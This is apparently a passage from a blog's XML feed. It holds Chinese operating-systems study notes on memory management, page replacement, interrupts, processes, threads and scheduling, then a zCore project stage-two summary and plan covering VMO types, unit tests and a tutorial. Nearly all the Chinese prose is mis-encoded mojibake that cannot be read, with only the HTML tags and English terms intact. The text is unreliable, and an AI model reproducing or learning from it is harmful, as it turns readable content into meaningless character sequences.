åˆ©ç”¨ä¸»å­˜åˆ†é…è¡¨</p><p>å­˜å‚¨ä¿æŠ¤ï¼šæƒé™ï¼Œåœ°å€ä¿æŠ¤å¼‚å¸¸</p><p>å­˜å‚¨æ‰©å……ï¼šå¯¹æ¢æŠ€æœ¯ï¼ˆä¸è¿è¡Œè¿›ç¨‹è°ƒå‡ºï¼‰ï¼Œè™šæ‹ŸæŠ€æœ¯ï¼ˆåªè°ƒå…¥éƒ¨åˆ†å†…å®¹ï¼‰</p><p>è™šæ‹ŸæŠ€æœ¯ï¼šéšç”¨éšè°ƒå…¥ï¼Œå®¹çº³è¿›ç¨‹è£…å…¥ï¼Œä¸»å­˜è´Ÿè´£è¿›ç¨‹æ‰§è¡Œï¼Œå¯¹ç”¨æˆ·é€æ˜</p><p>Cacheï¼šç”±SDRAMï¼Œè”æƒ³å­˜å‚¨å™¨ï¼Œåœ°å€è½¬æ¢éƒ¨ä»¶ï¼Œæ›¿æ¢é€»è¾‘ç»„æˆ</p><ul><li>L1 ï¼šæ•°æ®ç¼“å­˜ å’Œ æŒ‡ä»¤ç¼“å­˜</li><li>L2 : å†…ç½®å’Œå¤–ç½®</li><li>L3 : å¤šä¸ºå¤–ç½®</li></ul><p>å­˜å‚¨ç®¡ç†åŸºæœ¬æ¨¡å¼</p><ul><li><p>å•è¿ç»­å­˜å‚¨ç®¡ç†ï¼ˆä¸å¯è™šæ‹Ÿï¼‰</p><ul><li>ä¸»å­˜åˆ†ä¸ºç³»ç»ŸåŒºï¼Œç”¨æˆ·åŒº</li><li>æ …æ å¯„å­˜å™¨</li><li>é™æ€é‡å®šä½</li><li>é€‚ç”¨å•ç”¨æˆ·å•ä»»åŠ¡</li></ul><p>å›ºå®šåˆ†åŒºå­˜å‚¨ç®¡ç†ï¼šåˆ†åŒºæ•°é‡ï¼Œå¤§å°å›ºå®šï¼Œä¸»å­˜åˆ†é…è¡¨ï¼Œå¯åŠ¨æ€é‡å®šä½ï¼Œæœ‰å†…å­˜å†…é›¶å¤´</p><p>å¯å˜åˆ†åŒºï¼šå·²åˆ†é…åŒºè¡¨å’Œæœªåˆ†é…åŒºè¡¨ï¼ˆé“¾è¡¨ï¼‰ï¼Œå†…å­˜å›æ”¶ï¼Œç§»åŠ¨åˆ†åŒºï¼ˆåŸºäºåŠ¨æ€é‡å®šä½ï¼‰</p></li><li><p>æ®µå¼å­˜å‚¨ç®¡ç†</p><ul><li>é€»è¾‘åœ°å€ï¼šæ®µå·ï¼šå•å…ƒå·</li><li>æ®µè¡¨é¡¹ï¼šå§‹å€ï¼Œé™é•¿ï¼Œæ ‡å¿—ä½</li><li>å…±äº«ï¼šä¸åŒè¿›ç¨‹æ®µè¡¨é¡¹æŒ‡å‘åŒä¸€ä¸ªæ®µåŸºå€ å¹¶åŠ ä¿æŠ¤</li><li>è™šæ‹Ÿå­˜å‚¨ï¼šåŠ¨æ€è£…å…¥ï¼Œä¸æ®µè¦†ç›–ä¸åŒï¼Œç”¨æˆ·æ§åˆ¶ï¼ŒOSä¸æ„ŸçŸ¥</li></ul></li><li><p>é¡µå¼å­˜å‚¨ç®¡ç†</p><ul><li>ç‰©ç†ï¼šé¡µæ¶ ï½œ é€»è¾‘ï¼šé¡µ ï½œ å¯ä¸è¿ç»­ </li><li>é¡µè¡¨ï¼šé¡µ -  é¡µæ¶ ä¸€ä¸€å¯¹åº”</li><li>é€»è¾‘åœ°å€ï¼šã€Šé¡µå·ï¼Œå•å…ƒå·ã€‹</li><li>ä½ç¤ºå›¾ï¼šè®°å½•ä¸»å­˜åˆ†é…æƒ…å†µ</li><li>å…±äº«ï¼šä¸åŒè¿›ç¨‹å¯ä»¥ä½¿ç”¨ä¸åŒé¡µå·å…±äº«æ•°æ®é¡µï¼Œä½†å¿…é¡»ä½¿ç”¨ç›¸åŒé¡µå·å…±äº«ä»£ç é¡µï¼ˆå¦åˆ™JMPã€Šé¡µå†…åœ°å€ã€‹å¤±æ•ˆï¼‰ </li><li>å¿«è¡¨ï¼šCacheï¼ˆè”æƒ³å­˜å‚¨å™¨ï¼‰ä¸­çš„éƒ¨åˆ†é¡µè¡¨</li><li>è¿›ç¨‹è¡¨ï¼šæ ‡è®° è¿›ç¨‹ï¼Œé¡µè¡¨å§‹å€ï¼Œé¡µè¡¨é•¿åº¦</li></ul><p>è™šæ‹Ÿå­˜å‚¨ï¼š</p><ul><li>é¦–æ¬¡åªæŠŠè¿›ç¨‹ç¬¬ä¸€é¡µè£…å…¥ ï¼šè¯·æ±‚é¡µå¼å­˜å‚¨ç®¡ç†</li><li>æ‰©å……é¡µè¡¨é¡¹ï¼šè™šæ‹Ÿåœ°å€ï¼Œå®é™…åœ°å€ï¼Œæ ‡å¿—ä½</li><li>å®ç°ï¼šCPUå¤„ç†ä¸åœ¨ä¸»å­˜ï¼Œç¼ºé¡µä¸­æ–­ï¼›OSå¤„ç†åŠå…¥ç©ºé—²é¡µæ¶æˆ–è°ƒå‡ºå…¶ä»–é¡µ</li></ul></li><li><p>æ®µé¡µå¼å­˜å‚¨ç®¡ç†</p><ul><li>æ¯ä¸€æ®µä¸å¿…å æ®è¿ç»­å­˜å‚¨ç©ºé—´ï¼Œå¯ç¦»æ•£å­˜æ”¾åœ¨ä¸»å­˜é¡µæ¶ä¸­</li><li>æ®µè¡¨é¡¹ï¼šæ ‡å¿—ï¼Œé¡µè¡¨é•¿ï¼Œé¡µè¡¨å§‹å€</li><li>é€»è¾‘åœ°å€ï¼šæ®µå·ï¼Œé¡µå·ï¼Œå•å…ƒå·</li><li>å¿«è¡¨æ— ï¼ŒæŸ¥è¯¢è¿‡ç¨‹ï¼šæŸ¥æ®µè¡¨å¾—åˆ°é¡µè¡¨ï¼Œé¡µå·ä¸ºåç§»é‡ï¼ŒæŸ¥åˆ°å—å·ï¼Œ+å•å…ƒå·å¾—åˆ°ç‰©ç†åœ°å€</li></ul></li></ul><p>é¡µé¢è°ƒåº¦ï¼š</p><ul><li>ç¼ºé¡µä¸­æ–­ç‡ï¼šä¸æˆåŠŸè®¿é—®/æ€»è®¿é—®</li><li>å½±å“â¬†ï¸ï¼šå¯ç”¨é¡µæ¶æ•°ï¼Œé¡µé¢å¤§å° ï¼Œç®—æ³•</li><li>OPTï¼šä¼˜å…ˆæ·˜æ±°ä¸‹ä¸€æ¬¡è®¿é—®ç¦»è¿™æ¬¡æœ€è¿œçš„é¡µé¢</li><li>FIFOï¼šä¼˜å…ˆæ·˜æ±°æœ€å…ˆè°ƒå…¥ä¸»å­˜çš„é‚£ä¸€é¡µ</li><li>LRUï¼šä¼˜å…ˆæ·˜æ±°æœ€ä¹…æœªè¢«è®¿é—®</li><li>CLOCKï¼šå¾ªç¯é˜Ÿåˆ—</li></ul><p>åç½®é¡µè¡¨</p><ul><li><p>IPTï¼šMMUç”¨çš„æ•°æ®ç»“æ„</p></li><li><p>é¡µè¡¨é¡¹ï¼šé¡µæ¶å·ä»£è¡¨åºå·ï¼Œé¡µå·ï¼Œè¿›ç¨‹æ ‡å¿—ç¬¦ï¼Œæ ‡å¿—ä½</p></li><li><p> <strong>MMU</strong>é€šè¿‡å“ˆå¸Œè¡¨æŠŠè¿›ç¨‹æ ‡è¯†å’Œè™šé¡µå·è½¬ æ¢æˆä¸€ä¸ªå“ˆå¸Œå€¼ï¼ŒæŒ‡å‘<strong>IPT</strong>çš„ä¸€ä¸ªè¡¨ç›®</p></li><li><p>*MMU**éå†å“ˆå¸Œé“¾æ‰¾åˆ°æ‰€éœ€è¿›ç¨‹çš„è™šé¡µå·ï¼Œ è¯¥é¡¹çš„ç´¢å¼•å°±æ˜¯é¡µæ¶å·ï¼Œé€šè¿‡æ‹¼æ¥ä½ç§»ä¾¿å¯ç”Ÿæˆç‰©ç†åœ°å€</p></li></ul><p>  è‹¥éå†æ•´ä¸ªåç½®é¡µè¡¨ä¸­æœªèƒ½æ‰¾åˆ°åŒ¹é…é¡µè¡¨é¡¹ï¼Œè¯´æ˜è¯¥é¡µä¸åœ¨å†…å­˜ï¼Œäº§ç”Ÿç¼ºé¡µä¸­æ–­ï¼Œ è¯·æ±‚æ“ä½œç³»ç»Ÿè°ƒå…¥</p><h2 id="ä¸­æ–­-ä¸-ç³»ç»Ÿç»“æ„"><a href="#ä¸­æ–­-ä¸-ç³»ç»Ÿç»“æ„" class="headerlink" title="ä¸­æ–­ ä¸ ç³»ç»Ÿç»“æ„"></a>ä¸­æ–­ ä¸ ç³»ç»Ÿç»“æ„</h2><h3 id="å¯„å­˜å™¨"><a href="#å¯„å­˜å™¨" class="headerlink" title="å¯„å­˜å™¨"></a>å¯„å­˜å™¨</h3><ul><li>ç”¨æˆ·ç¨‹åºå¯è§å¯„å­˜å™¨ï¼šæ•°æ®ï¼Œåœ°å€ï¼ˆæ ˆæŒ‡é’ˆç­‰ï¼‰</li><li>æ§åˆ¶ä¸çŠ¶æ€å¯„å­˜å™¨ï¼šPCï¼ŒCCï¼Œæ ‡å¿—ä½ç­‰</li><li>ç¨‹åºçŠ¶æ€å­— PSWï¼Œ</li></ul><h3 id="æŒ‡ä»¤"><a href="#æŒ‡ä»¤" class="headerlink" title="æŒ‡ä»¤"></a>æŒ‡ä»¤</h3><ul><li>å–æŒ‡ï¼Œè¯‘ç ï¼Œæ‰§è¡Œ</li><li>ç‰¹æƒæŒ‡ä»¤ï¼ˆOSå†…æ ¸ä½¿ç”¨ï¼‰ï¼Œéç‰¹æƒï¼šç”¨æˆ·å¯ç”¨</li><li>å¤„ç†å™¨æ¨¡å¼ï¼š<ul><li>ç”¨æˆ·-å†…æ ¸ ï¼š ç³»ç»Ÿè°ƒç”¨ï¼Œå¼‚å¸¸ï¼Œå“åº”ä¸­æ–­</li><li>å†…æ ¸-ç”¨æˆ· ï¼š ä¸­æ–­è¿”å›æŒ‡ä»¤</li></ul></li></ul><h3 id="ä¸­æ–­"><a href="#ä¸­æ–­" class="headerlink" title="ä¸­æ–­"></a>ä¸­æ–­</h3><ul><li>æ“ä½œç³»ç»Ÿ â€œä¸­æ–­é©±åŠ¨â€ï¼Œä¸­æ–­æ˜¯æ¿€æ´»æ“ä½œç³»ç»Ÿå”¯ä¸€æ–¹å¼</li><li>ç‹­ä¹‰ä¸­æ–­ï¼ˆå¤„ç†å™¨ä¹‹å¤–ä¸­æ–­ï¼‰ï¼Œå¼‚å¸¸ï¼ˆè¿è¡ŒæŒ‡ä»¤ä¸­æ–­ï¼‰ï¼Œç³»ç»Ÿå¼‚å¸¸ï¼ˆç³»ç»Ÿè°ƒç”¨ï¼‰</li><li>ä¸­æ–­ç³»ç»Ÿï¼šç¡¬ä»¶å­ç³»ç»Ÿï¼ˆä¸­æ–­å“åº”ï¼‰ï¼Œè½¯ä»¶å­ç³»ç»Ÿï¼ˆä¸­æ–­å¤„ç†ï¼‰</li><li>æŒ‡ä»¤æ‰§è¡Œå‘¨æœŸæœ€åå¢åŠ  å“åº”ä¸­æ–­æ“ä½œ</li><li>ä¸­æ–­è£…ç½® ï¼š å‘ç°å¹¶å“åº”ä¸­æ–­<ul><li>å¤„ç†å™¨å¤–çš„ä¸­æ–­:ç”±ä¸­æ–­æ§åˆ¶å™¨å‘ç°å’Œå“åº”</li><li>å¤„ç†å™¨å†…çš„å¼‚å¸¸:ç”±æŒ‡ä»¤çš„æ§åˆ¶é€»è¾‘å’Œå®ç°çº¿è·¯å‘ç°å’Œå“åº”ï¼Œç›¸åº”æœºåˆ¶ç§°ä¸ºé™·é˜±</li><li>Syscall: å¤„ç†å™¨æ‰§è¡Œé™·å…¥æŒ‡ä»¤æ—¶ç›´æ¥è§¦å‘ï¼Œç›¸åº”æœºåˆ¶ç§°ä¸ºç³»ç»Ÿé™·é˜±</li></ul></li><li>ä¸­æ–­æ§åˆ¶å™¨ï¼šæ§åˆ¶ å’Œ å¯„å­˜å™¨<ul><li>å¯„å­˜å™¨è®°å½•ä¸­æ–­ ï¼ŒæŒ‡ä»¤å¤„ç†æœ€åæ£€æŸ¥å¯„å­˜å™¨</li></ul></li><li>é™·é˜± ä¸ ç³»ç»Ÿé™·é˜±</li><li>ä¸­æ–­å“åº”è¿‡ç¨‹ï¼š<ul><li>æ£€æŸ¥ä¸­æ–­å¯„å­˜å™¨ï¼Œæ˜¯å¦è¯¥å±è”½ï¼Œæ ¹æ®ä¼˜å…ˆçº§é€‰æ‹©</li><li>ä¿å­˜ PSW/PC åˆ° æ ¸å¿ƒæ ˆ</li><li>è½¬åˆ° ä¸­æ–­å¤„ç†ç¨‹åº</li></ul></li><li>ä¸­æ–­å¤„ç†<ul><li>ä¿æŠ¤å¤„ç†å™¨çŠ¶æ€</li><li>è¯†åˆ«ä¸­æ–­æº</li><li>å¤„ç†ä¸­æ–­</li><li>æ¢å¤æ­£å¸¸æ“ä½œ - è¿”å›ä¸­æ–­è¿›ç¨‹ æˆ– è°ƒæ•´è¿›ç¨‹é˜Ÿåˆ—</li></ul></li><li>å¤šä¸­æ–­å¤„ç†ï¼š å±è”½ ï¼Œä¼˜å…ˆçº§ï¼ŒåµŒå¥—ï¼ˆã€Š=3ï¼Œå¯èƒ½æ”¹å˜å¤„ç†é¡ºåºï¼‰</li></ul><h2 id="è¿›ç¨‹"><a href="#è¿›ç¨‹" class="headerlink" title="è¿›ç¨‹"></a>è¿›ç¨‹</h2><p>è¿›ç¨‹ ï¼š åŠ¨æ€ ï¼Œ èµ„æºåˆ†é…å’Œè°ƒåº¦çš„åŸºæœ¬å•ä½</p><p>åŒ…æ‹¬ï¼šOSç®¡ç†çš„æ•°æ®ç»“æ„Pï¼Œå†…å­˜ä»£ç Cï¼Œå†…å­˜æ•°æ®Dï¼Œé€šç”¨å¯„å­˜å™¨ä¿¡æ¯Rï¼Œç¨‹åºçŠ¶æ€å­—PSW</p><p>å¯å†å…¥ç¨‹åºï¼šç›¸åŒä»£ç ä¸åŒæ•°æ®é›†ï¼Œçº¯ä»£ç </p><p>ä¸åŒæ—¶é—´ä¸­é’ˆå¯¹ åŒä¸€ä¸ªç¨‹åºè¿è¡Œ å½¢æˆä¸¤ä¸ªä¸åŒçš„è¿›ç¨‹</p><p>è¿›ç¨‹çŠ¶æ€ï¼š</p><ul><li><p>è¿è¡Œæ€ï¼Œå°±ç»ªæ€ï¼Œç­‰å¾…æ€</p></li><li><pre><code class="mermaid">graph TDA(è¿è¡Œæ€) --&gt;|è½é€‰| B(å°±ç»ªæ€)B(å°±ç»ªæ€) --&gt;|é€‰ä¸­| A(è¿è¡Œæ€)C(ç­‰å¾…æ€) --&gt; |ç­‰å¾…äº‹ä»¶ç»“æŸ|B(å°±ç»ªæ€)A(è¿è¡Œæ€) --&gt; |å‡ºç°ç­‰å¾…äº‹ä»¶| C(ç­‰å¾…æ€)</code></pre></li><li><p>æŒ‚èµ·</p></li></ul><p>è¿›ç¨‹æ§åˆ¶å— PCBï¼š</p><ul><li>æ ‡è¯†ä¿¡æ¯  - ç°åœºä¿¡æ¯ï¼ˆå¯„å­˜å™¨ï¼‰ - æ§åˆ¶ä¿¡æ¯</li></ul><p>è¿›ç¨‹æ˜ åƒï¼ˆå†…å­˜æ˜ åƒï¼‰ï¼š PCBï¼Œç¨‹åºå—ï¼Œæ•°æ®å—ï¼Œæ ¸å¿ƒæ ˆ</p><p>è¿›ç¨‹ä¸Šä¸‹æ–‡ï¼šç”¨æˆ·çº§ï¼Œå¯„å­˜å™¨ï¼Œç³»ç»Ÿçº§</p><p>é˜Ÿåˆ—ç®¡ç†æ¨¡å—ï¼šè¿›ç¨‹ç®¡ç†æ ¸å¿ƒæ¨¡å—</p><p>è¿›ç¨‹æ§åˆ¶ä¸ç®¡ç†ï¼š</p><ul><li>è¿›ç¨‹åˆ›å»º:è¿›ç¨‹è¡¨åŠ ä¸€é¡¹ï¼Œç”³è¯·PCBå¹¶åˆå§‹åŒ–ï¼Œ ç”Ÿæˆæ ‡è¯†ï¼Œå»ºç«‹æ˜ åƒï¼Œåˆ†é…èµ„æºï¼Œç§»å…¥å°±ç»ªé˜Ÿåˆ—<br>â€¢ è¿›ç¨‹æ’¤é”€:ä»é˜Ÿåˆ—ä¸­ç§»é™¤ï¼Œå½’è¿˜èµ„æºï¼Œæ’¤é”€æ ‡è¯†ï¼Œ å›æ”¶PCBï¼Œç§»é™¤è¿›ç¨‹è¡¨é¡¹<br>â€¢ è¿›ç¨‹é˜»å¡:ä¿å­˜ç°åœºä¿¡æ¯ï¼Œä¿®æ”¹PCBï¼Œç§»å…¥ç­‰å¾… é˜Ÿåˆ—ï¼Œè°ƒåº¦å…¶ä»–è¿›ç¨‹æ‰§è¡Œ<br>â€¢ è¿›ç¨‹å”¤é†’:ç­‰å¾…é˜Ÿåˆ—ä¸­ç§»å‡ºï¼Œä¿®æ”¹PCBï¼Œç§»å…¥å°± ç»ªé˜Ÿåˆ—(è¯¥è¿›ç¨‹ä¼˜å…ˆçº§é«˜äºè¿è¡Œè¿›ç¨‹è§¦å‘æŠ¢å )<br>â€¢ è¿›ç¨‹æŒ‚èµ·:ä¿®æ”¹çŠ¶æ€å¹¶å‡ºå…¥ç›¸å…³é˜Ÿåˆ—ï¼Œæ”¶å›å†…å­˜ç­‰èµ„æºé€è‡³å¯¹æ¢åŒº<br>â€¢ è¿›ç¨‹æ¿€æ´»:åˆ†é…å†…å­˜ï¼Œä¿®æ”¹çŠ¶æ€å¹¶å‡ºå…¥ç›¸å…³é˜Ÿåˆ—<br>â€¢ å…¶ä»–:å¦‚ä¿®æ”¹è¿›ç¨‹ç‰¹æƒ</li></ul><h4 id="è¿›ç¨‹åˆ‡æ¢ï¼š"><a href="#è¿›ç¨‹åˆ‡æ¢ï¼š" class="headerlink" title="è¿›ç¨‹åˆ‡æ¢ï¼š"></a>è¿›ç¨‹åˆ‡æ¢ï¼š</h4><p>ä¸­æ–­è§¦å‘ ï¼Œå‹å…¥PSW/PC</p><p>å¤„ç†ä¸­æ–­</p><p>è¢«ä¸­æ–­è¿›ç¨‹ ä¿å­˜å€¼ï¼Œ çŠ¶æ€è°ƒæ•´ï¼ŒåŠ å…¥é˜Ÿåˆ—</p><p>é€‰ä¸­ä¸‹ä¸€ä¸ªè¿›ç¨‹</p><p>è°ƒæ•´æ¢å¤ï¼Œé€‰ä¸­è¿›ç¨‹</p><p>ä¸­æ–­è¿”å›ï¼Œå¼¹å‡ºPSW/PC</p><h2 id="çº¿ç¨‹"><a href="#çº¿ç¨‹" class="headerlink" title="çº¿ç¨‹"></a>çº¿ç¨‹</h2><p>å•çº¿ç¨‹ï¼ˆè¿›ç¨‹ï¼‰é—®é¢˜ï¼šè¿›ç¨‹åˆ‡æ¢å¼€é”€å¤§ï¼Œè¿›ç¨‹é€šä¿¡å¼€é”€å¤§ï¼Œé™åˆ¶äº†è¿›ç¨‹å¹¶å‘çš„ç²’åº¦ï¼Œé™ä½äº†å¹¶è¡Œè®¡ç®—çš„æ•ˆç‡</p><p>å°†è¿›ç¨‹ èµ„æºåˆ†é… å’Œ ç³»ç»Ÿè°ƒåº¦åˆ†æ´¾æ‰§è¡Œåˆ†ç¦»å¼€ï¼š</p><ul><li>è¿›ç¨‹ ï¼š ç³»ç»Ÿèµ„æºåˆ†é… å’Œä¿æŠ¤çš„ç‹¬ç«‹å•ä½ï¼Œä¸éœ€é¢‘ç¹åˆ‡æ¢ ï¼ˆå®¹çº³è¿›ç¨‹æ˜ åƒï¼Œå­˜å–ä¿æŠ¤ï¼‰</li><li>çº¿ç¨‹ ï¼šç³»ç»Ÿè°ƒåº¦å’Œåˆ†é…çš„åŸºæœ¬å•ä½ï¼Œèƒ½è½»æ¾çš„è¢«é¢‘ç¹åœ°è°ƒåº¦å’Œåˆ‡æ¢<ul><li>å…·æœ‰ï¼šçº¿ç¨‹æ‰§è¡ŒçŠ¶æ€ï¼Œå—ä¿æŠ¤çš„ä¸Šä¸‹æ–‡ï¼Œç‹¬ç«‹ç¨‹åºæŒ‡ä»¤è®¡æ•°å™¨ï¼Œæ‰§è¡Œå †æ ˆï¼Œé™æ€å­˜å‚¨å™¨ï¼ˆå±€éƒ¨å˜é‡ï¼‰</li><li>çŠ¶æ€ï¼šè¿è¡Œï¼Œå°±ç»ªï¼Œç¡çœ </li></ul></li></ul><p>å¹¶å‘å¤šçº¿ç¨‹ä¼˜ç‚¹ï¼š å¿«é€Ÿçº¿ç¨‹åˆ‡æ¢ï¼Œå‡å°‘ç³»ç»Ÿç®¡ç†å¼€é”€ï¼Œçº¿ç¨‹é€šä¿¡æ˜“äºå®ç°ï¼Œå¹¶è¡Œç¨‹åº¦æé«˜ï¼ŒèŠ‚çœå†…å­˜ç©ºé—´</p><p>KLTï¼šå†…æ ¸è°ƒåº¦æ–¹ä¾¿ï¼Œæœ¬èº«ä¹Ÿå¯å¤šçº¿ç¨‹ï¼Œä½†æ˜¯åº”ç”¨ç¨‹åºçº¿ç¨‹åœ¨ç”¨æˆ·æ€ï¼Œæ§åˆ¶æƒåˆ‡æ¢éœ€è¦æ¨¡å¼åˆ‡æ¢ï¼Œå¼€é”€å¤§</p><p>ULTï¼šèŠ‚çœæ¨¡å¼åˆ‡æ¢å¼€é”€ï¼Œä¸æ‰“æ‰°å†…æ ¸ï¼Œç¨‹åºç®¡ç†ï¼›è¿è¡Œåœ¨ä»»ä½•OSï¼›ç¼ºç‚¹ï¼šä¸èƒ½åˆ©ç”¨å¤šå¤„ç†å™¨ï¼Œå¼•èµ·è¿›ç¨‹å µå¡</p><ul><li>å¯ç”¨ jacketing ç¨‹åº æ¥å†³å®š è¿›ç¨‹åˆ‡æ¢ æˆ– ä¼ é€’æ§åˆ¶æƒç»™å¦ä¸€ä¸ªçº¿ç¨‹</li><li>å†…æ ¸åªè´Ÿè´£è¿›ç¨‹è°ƒåº¦</li></ul><p>ULTï¼šé€»è¾‘å¹¶è¡Œæ€§ KLTï¼šç‰©ç†å¹¶è¡Œæ€§</p><p>æ··åˆæ¨¡å¼ï¼šå¤šä¸ªULTæ˜ å°„ä¸€äº›KLT</p><h2 id="å¤„ç†å™¨è°ƒåº¦"><a href="#å¤„ç†å™¨è°ƒåº¦" class="headerlink" title="å¤„ç†å™¨è°ƒåº¦"></a>å¤„ç†å™¨è°ƒåº¦</h2><p>é«˜çº§è°ƒåº¦ï¼šèƒ½å¦åŠ å…¥åˆ°æ‰§è¡Œçš„è¿›ç¨‹æ± ä¸­ ï¼ˆå¤šæ–°å»º ç»ˆæ­¢ï¼‰</p><p>ä¸­çº§è°ƒåº¦ï¼šå†³å®šä¸»å­˜ä¸­çš„å¯ç”¨è¿›ç¨‹é›†åˆ ï¼ˆå¸¦ æŒ‚èµ·ï¼‰</p><p>ä½çº§è°ƒåº¦ï¼šå†³å®šå“ªä¸ªå¯ç”¨è¿›ç¨‹å ç”¨å¤„ç†å™¨æ‰§è¡Œ ï¼ˆåŸä¸‰æ€ï¼‰</p>]]></content>
      
      
      
        <tags>
            
            <tag> OS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zCore ç¬¬äºŒé˜¶æ®µæ€»ç»“åŠè§„åˆ’</title>
      <link href="/2020/08/01/%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5%E6%80%BB%E7%BB%93%E5%8F%8A%E8%A7%84%E5%88%92/"/>
      <url>/2020/08/01/%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5%E6%80%BB%E7%BB%93%E5%8F%8A%E8%A7%84%E5%88%92/</url>
      
        <content type="html"><![CDATA[<p>æœ¬æ–‡æ˜¯zCore çš„ç¬¬äºŒé˜¶æ®µçš„æ€»ç»“ä»¥åŠå¯¹æ¥ä¸‹æ¥å·¥ä½œçš„è§„åˆ’</p><a id="more"></a><h1 id="ç¬¬äºŒé˜¶æ®µ-æ€»ç»“-åŠ-è§„åˆ’"><a href="#ç¬¬äºŒé˜¶æ®µ-æ€»ç»“-åŠ-è§„åˆ’" class="headerlink" title="ç¬¬äºŒé˜¶æ®µ æ€»ç»“ åŠ è§„åˆ’"></a>ç¬¬äºŒé˜¶æ®µ æ€»ç»“ åŠ è§„åˆ’</h1><h3 id="è®¡åˆ’å’Œæ€»ç»“"><a href="#è®¡åˆ’å’Œæ€»ç»“" class="headerlink" title="è®¡åˆ’å’Œæ€»ç»“"></a>è®¡åˆ’å’Œæ€»ç»“</h3><h3 id="é€Ÿåº¦-ï¼ˆæœ‰ç‚¹ç²—ç³™ï¼‰-ä½†æ˜¯-å¿«é€Ÿè¿­ä»£"><a href="#é€Ÿåº¦-ï¼ˆæœ‰ç‚¹ç²—ç³™ï¼‰-ä½†æ˜¯-å¿«é€Ÿè¿­ä»£" class="headerlink" title="é€Ÿåº¦ ï¼ˆæœ‰ç‚¹ç²—ç³™ï¼‰ ä½†æ˜¯ å¿«é€Ÿè¿­ä»£"></a>é€Ÿåº¦ ï¼ˆæœ‰ç‚¹ç²—ç³™ï¼‰ ä½†æ˜¯ å¿«é€Ÿè¿­ä»£</h3><h3 id="VMO"><a href="#VMO" class="headerlink" title="VMO"></a>VMO</h3><p>ä¸»è¦çš„ç±»å‹ ï¼š </p><ul><li><p>VMObjectPaged : ä¸»è¦çš„VMO ï¼Œ æŒæ§ä¸€ç»„ç‰©ç†é¡µé¢</p><ul><li>çˆ¶èŠ‚ç‚¹</li><li>æŒæ§çš„ç‰©ç†é¡µé¢</li><li>æ˜ å°„å…³ç³»</li><li>æ ‡å¿—ä½  <strong>é«˜é€Ÿç¼“å­˜ç­–ç•¥</strong>  <strong>pin_count</strong> ç­‰</li></ul></li><li><p>VMObjectPhysical ï¼šä»£è¡¨ä¸€æ®µè¿ç»­ç‰©ç†å†…å­˜</p></li><li><p>VMObjectSlice : ç‰©ç†å†…å­˜åˆ‡ç‰‡</p></li></ul><p>æ ‘çŠ¶ç»“æ„ ï¼š</p><ul><li>åˆ©ç”¨ çˆ¶èŠ‚ç‚¹çš„ åç§»é‡ å’Œ é¡µé¢é™åˆ¶æ¥å®ç°</li></ul><img src="https://github.com/dingiso/DailySchedule/blob/master/img/VMObject.png?raw=true" alt="VMObjectå›¾ç‰‡ä»‹ç»"><h2 id="ç›®æ ‡"><a href="#ç›®æ ‡" class="headerlink" title="ç›®æ ‡"></a>ç›®æ ‡</h2><h3 id="å•å…ƒæµ‹è¯•"><a href="#å•å…ƒæµ‹è¯•" class="headerlink" title="å•å…ƒæµ‹è¯•"></a>å•å…ƒæµ‹è¯•</h3><p>å®Œå–„ <code>VMO</code> éƒ¨åˆ†çš„ <strong>å•å…ƒæµ‹è¯•</strong></p><h3 id="ç®€åŒ–"><a href="#ç®€åŒ–" class="headerlink" title="ç®€åŒ–"></a>ç®€åŒ–</h3><p>å¯¹æ ‘ç»“æ„çš„ ç®€åŒ–</p><p>åŒ…æ‹¬ æ›¾ç»ï¼Œ <strong>copy_on_write</strong>  åˆ©ç”¨ ä¸€ä½æ ‡å¿—ä½å®ç°ï¼Œå¹¶è°ƒæ•´å¯è¯»å†™ä¸ºï¼Œå®ç°ä¸å¯å†™ï¼Œæœ€ç»ˆåœ¨ pagefaultçš„æ—¶å€™åœ¨è¿›è¡Œ <strong>copy</strong></p><p><strong>åˆ°</strong></p><p>ç›´æ¥ <strong>copy</strong></p><h3 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h3><p>shell éƒ¨åˆ† å¯èƒ½æœ‰ä¸€äº› VMO éƒ¨åˆ†çš„bugéœ€è¦ï¼Œåœ¨<code>zCore</code> æ•´ä½“äº†è§£åï¼Œdeè¿™éƒ¨åˆ†çš„bug</p><h3 id="å»ºè®®"><a href="#å»ºè®®" class="headerlink" title="å»ºè®®"></a>å»ºè®®</h3><p>æ€»è§‰å¾— Tutorial å¯¹äº å­¦ç”Ÿçš„ç†è§£æœ‰ç‚¹ç”Ÿæ¶©<br>æˆ‘çš„è®¡åˆ’æ˜¯æŒ‰ç…§å­¦é•¿çš„è®¡åˆ’</p><ul><li>PPT æˆ– è§†é¢‘<strong>æŠ¥å‘Š</strong> </li><li>åŸºç¡€çŸ¥è¯†çš„ä»‹ç»</li><li>ä»£ç  å’Œ æµ‹è¯•çš„ç¼–å†™</li><li>æ€»ç»“</li></ul><h2 id="æ—¶é—´è®¡åˆ’"><a href="#æ—¶é—´è®¡åˆ’" class="headerlink" title="æ—¶é—´è®¡åˆ’"></a>æ—¶é—´è®¡åˆ’</h2><p><strong>8.15-30</strong> æœŸæœ«è€ƒè¯•ï¼Œå¸Œæœ›ä½œä¸ºæ—¶é—´åˆ†é…ï¼Œé€æ¸æ…¢æ…¢æ¨è¿›</p><p><strong>9.1 å·ä¹‹å</strong> æˆ‘çš„ç›®æ ‡ä»ç„¶è¿˜æ˜¯å¸Œæœ›ç»§ç»­è¿›è¡Œ zCore-Tutorial å¯èƒ½å°±æ˜¯è®¾è®¡ zCore-Tutorial å®éªŒï¼Œäº‰å–å¼€è‚ <strong>zCore-Tutorial v2</strong> </p><h2 id="å¯èƒ½é‡åˆ°çš„é—®é¢˜"><a href="#å¯èƒ½é‡åˆ°çš„é—®é¢˜" class="headerlink" title="å¯èƒ½é‡åˆ°çš„é—®é¢˜"></a>å¯èƒ½é‡åˆ°çš„é—®é¢˜</h2><ul><li><code>debug</code> è¿‡ç¨‹ä¸­å¯èƒ½é‡åˆ°ä¸å¯çŸ¥çš„éš¾åº¦</li><li><code>Tutorial</code> ç¼–å†™è¿‡ç¨‹ä¸­ï¼Œå¸Œæœ›èƒ½ ä»¥ä¸ªäººä¸ºå•ä½ï¼Œè‡ªå·±å®ŒæˆzCore æ•´ä½“çš„å¤ç°ï¼Œå¯èƒ½ä¼šé‡åˆ°é—®é¢˜</li><li>ç­‰ç­‰</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> OS </tag>
